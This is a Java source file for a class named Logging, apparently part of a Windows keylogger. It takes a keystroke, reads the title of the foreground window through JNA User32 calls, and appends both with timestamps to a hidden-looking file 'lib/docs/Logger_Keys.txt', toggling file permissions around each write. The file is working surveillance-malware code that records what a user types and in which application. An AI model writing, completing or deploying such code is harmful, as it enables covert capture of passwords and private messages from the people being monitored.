//here the 'cntrl_lognote' is used to separate the applicaton name part of the logging file, in order to make a button of it
import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;

import java.awt.*;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Logging extends Component {
    static final int MAX_TITLE_LENGTH = 1024;
    static String windowName = "", textFileName = "lib/docs/Logger_Keys.txt";
    FilePermissions fp;

    public Logging(String key) {
    	fp=new FilePermissions();
        File f=new File(textFileName);
        fp.GrantFilePermissions(f);
        try {
            BufferedWriter bw = new BufferedWriter(new FileWriter(f, true));
            PrintWriter pw = new PrintWriter(bw);
            char[] buffer = new char[MAX_TITLE_LENGTH * 2];
            WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();
            User32.INSTANCE.GetWindowText(hwnd, buffer, MAX_TITLE_LENGTH);
            String buffer_windowName = Native.toString(buffer);

            if (windowName.equalsIgnoreCase(buffer_windowName) == false) {
                if (buffer_windowName.equals("") == false) {
                    //System.out.println("Active window title: " + buffer_windowName);
                    DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
                    Date date = new Date();
                    String logging_time = dateFormat.format(date);
                    pw.println("\ncntrl_lognote " + logging_time + " ---> Application : " + buffer_windowName + "~");
                    windowName = buffer_windowName;
                }
            }
            pw.print(key);
            pw.close();
            bw.close();
            fp.RevokeFilePermissions(f);
        } catch (IOException e) {
            //System.out.println("Permission not granted to the loggin class...");
            //JOptionPane.showMessageDialog(null, e.toString()+"from logging");
            //System.out.println("Not writing in the file...");
        }
    }
}
